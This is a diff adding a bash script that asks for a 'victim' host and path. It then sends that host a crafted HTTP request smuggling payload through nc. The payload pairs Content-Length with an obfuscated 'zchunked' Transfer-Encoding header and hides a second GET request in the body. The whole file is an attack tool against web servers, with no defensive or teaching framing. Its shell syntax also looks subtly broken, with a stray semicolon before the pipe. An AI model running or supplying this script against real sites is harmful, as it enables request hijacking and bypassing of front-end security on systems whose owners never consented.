@@ -1,0 +1,22 @@
+#!/bin/bash
+echo -ne "[+] Enter Victim: "
+read victim
+
+echo -ne "[+] Enter Path: "
+read pagepath
+
+
+echo "POST /$pagepath HTTP/1.1
+Content-Length: 51
+Transfer-Encoding: zchunked
+
+96
+
+GET /404 HTTP/1.1
+X: X=1&q=smugging&x=
+Host: $victim
+Content-Length: 100
+
+x=
+
+0"; | nc $victim 80
